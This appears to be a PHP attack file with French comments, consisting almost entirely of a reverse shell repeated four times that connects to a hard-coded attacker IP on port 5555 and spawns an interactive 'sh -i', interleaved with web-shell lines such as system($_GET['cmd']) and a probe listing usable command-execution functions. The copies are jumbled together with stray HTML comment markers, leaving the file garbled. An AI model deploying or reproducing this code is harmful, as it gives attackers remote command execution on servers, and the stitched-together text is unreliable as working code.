<?php
// Remplacez l'adresse IP et le port par ceux de votre machine d'écoute.
$ip = '84.6.222.90'; // Adresse IP de l'attaquant
$port = 5555;          // Port d'écoute

// Création de la connexion socket
$sock = fsockopen($ip, $port);
if ($sock) {
    // Redirection des flux d'entrée/sortie
    stream_set_blocking($sock, true);
    shell_exec("sh -i <&3 >&3 2>&3");
    fclose($sock);
} else {
    die('Impossible de se connecter au serveur.');
}?>
-->
// Remplacez l'adresse IP et le port par ceux de votre machine d'écoute.
$ip = '84.6.222.90'; // Adresse IP de l'attaquant
$port = 5555;          // Port d'écoute

// Création de la connexion socket
$sock = fsockopen($ip, $port);
if ($sock) {
    // Redirection des flux d'entrée/sortie
    stream_set_blocking($sock, true);
    shell_exec("sh -i <&3 >&3 2>&3");
    fclose($sock);
} else {
    die('Impossible de se connecter au serveur.');
}
-->
echo exec("ls -la");
echo shell_exec("ls -la");
system("whoami");
system($_GET['cmd']);
print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
 <!--
$ip = '84.6.222.90'; // Adresse IP de l'attaquant
$port = 5555;          // Port d'écoute

// Création de la connexion socket
$sock = fsockopen($ip, $port);
if ($sock) {
    // Redirection des flux d'entrée/sortie
    stream_set_blocking($sock, true);
    shell_exec("sh -i <&3 >&3 2>&3");
    fclose($sock);
} else {
    die('Impossible de se connecter au serveur.');
}
?>
<!--<?php
// Remplacez l'adresse IP et le port par ceux de votre machine d'écoute.
$ip = '84.6.222.90'; // Adresse IP de l'attaquant
$port = 5555;          // Port d'écoute

// Création de la connexion socket
$sock = fsockopen($ip, $port);
if ($sock) {
    // Redirection des flux d'entrée/sortie
    stream_set_blocking($sock, true);
    shell_exec("sh -i <&3 >&3 2>&3");
    fclose($sock);
} else {
    die('Impossible de se connecter au serveur.');
}
?>
